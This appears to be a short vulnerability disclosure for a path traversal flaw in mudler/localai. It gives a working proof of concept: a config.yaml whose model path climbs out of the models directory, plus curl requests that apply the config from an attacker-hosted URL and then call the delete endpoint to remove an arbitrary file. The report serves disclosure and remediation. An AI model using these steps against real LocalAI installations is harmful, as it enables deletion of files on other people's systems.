Title: Path Traversal in mudler/localai

Proof of Concept: 
For testing, create a file named deleteme.txt in the /tmp folder.

Save the following code as config.yaml.

name: "delete_test"
parameters:
  model: ../../../../../../../../tmp/deleteme.txt

usage: |
    foo

Start a python http server:  python3 -m http.server

Add a model.
curl http://localhost:8080/models/apply -X POST -H "Content-Type: application/json" -d '{"config_url":"<exploit_server>/config.yaml","id":""}'

The model name is the md5 hash of config_url, use this command to calculate this value: echo -n "<exploit_server>/config.yaml" | md5sum

Delete model
curl http://localhost:8080/models/delete/f26ecc271c5e79202b71619382c0c22b -X POST

When the process is completed, you will see that the file has been deleted.

Impact: 
Sensitive data can be deleted.
